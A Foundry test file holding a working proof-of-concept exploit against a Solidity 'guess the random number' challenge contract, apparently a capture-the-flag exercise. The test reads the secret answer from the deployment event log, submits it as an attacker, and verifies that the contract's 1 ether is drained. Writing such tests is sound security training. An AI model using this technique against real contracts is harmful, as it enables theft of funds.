// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/guess_the_random_number.sol";

contract GuessTheRandomNumberTest is Test {
    struct StateSnapshot {
        uint256 contractBalance;
        uint256 attackerBalance;
        uint256 totalGames;
        uint256 totalWins;
        uint256 playerWins;
    }

    GuessTheRandomNumberChallenge public challenge;
    address owner = address(0x123);
    address attacker = address(0x456);
    uint8 public answer;

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.recordLogs();
        vm.prank(owner);
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
        Vm.Log[] memory logs = vm.getRecordedLogs();

        // Extract answer from deployment event
        bytes32 eventSignature = keccak256("NewGameStarted(address,uint8)");
        Vm.Log memory gameStartedLog = logs[0];
        require(gameStartedLog.topics[0] == eventSignature, "Invalid event");
        answer = abi.decode(gameStartedLog.data, (uint8));
    }

    function testExploit() public {
        // Fund attacker with 1 ether to play the game
        vm.deal(attacker, 1 ether);

        console2.log("--- BEFORE-Trigger State ---");
        // Capture pre-exploit state using struct
        StateSnapshot memory preState = StateSnapshot({
            contractBalance: address(challenge).balance,
            attackerBalance: attacker.balance,
            totalGames: challenge.totalGames(),
            totalWins: challenge.totalWins(),
            playerWins: challenge.playerWins(attacker)
        });
        
        console2.log("Contract Balance: %s", preState.contractBalance);
        console2.log("Attacker Balance: %s", preState.attackerBalance);
        console2.log("Total Games: %s", preState.totalGames);
        console2.log("Total Wins: %s", preState.totalWins);
        console2.log("Attacker Wins: %s", preState.playerWins);

        console2.log("--- Trigger Exploit ---");
        // Attack executes exploit
        vm.prank(attacker);
        challenge.guess{value: 1 ether}(answer);
        
        console2.log("--- AFTER-Trigger State ---");
        // Capture post-exploit state using struct
        StateSnapshot memory postState = StateSnapshot({
            contractBalance: address(challenge).balance,
            attackerBalance: attacker.balance,
            totalGames: challenge.totalGames(),
            totalWins: challenge.totalWins(),
            playerWins: challenge.playerWins(attacker)
        });
        
        console2.log("Contract Balance: %s", postState.contractBalance);
        console2.log("Attacker Balance: %s", postState.attackerBalance);
        console2.log("Total Games: %s", postState.totalGames);
        console2.log("Total Wins: %s", postState.totalWins);
        console2.log("Attacker Wins: %s", postState.playerWins);

        // Verify state changes
        console2.log("--- Verification ---");
        bool contractBalanceReduced = postState.contractBalance < preState.contractBalance;
        bool attackerBalanceIncreased = postState.attackerBalance > preState.attackerBalance;
        bool gamesIncremented = postState.totalGames == preState.totalGames + 1;
        bool winsIncremented = postState.totalWins == preState.totalWins + 1;
        bool attackerWinsIncreased = postState.playerWins == preState.playerWins + 1;
        
        console2.log("Contract balance reduced: %s", contractBalanceReduced ? "YES" : "NO");
        console2.log("Attacker balance increased: %s", attackerBalanceIncreased ? "YES" : "NO");
        console2.log("Total games incremented: %s", gamesIncremented ? "YES" : "NO");
        console2.log("Total wins incremented: %s", winsIncremented ? "YES" : "NO");
        console2.log("Attacker wins increased: %s", attackerWinsIncreased ? "YES" : "NO");

        // Determine vulnerability existence
        bool vulnerabilityExists = contractBalanceReduced &&
                                   attackerBalanceIncreased &&
                                   gamesIncremented &&
                                   winsIncremented &&
                                   attackerWinsIncreased;
        
        // Final verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Attacker successfully drained funds and altered game state");
        } else {
            console2.log("Vulnerability not Exist: Exploit did not produce expected state changes");
        }

        // Original assertions
        assertEq(postState.contractBalance, 0, "Contract balance should be 0");
        assertEq(preState.contractBalance, 1 ether, "Initial contract balance should be 1 ether");
    }
}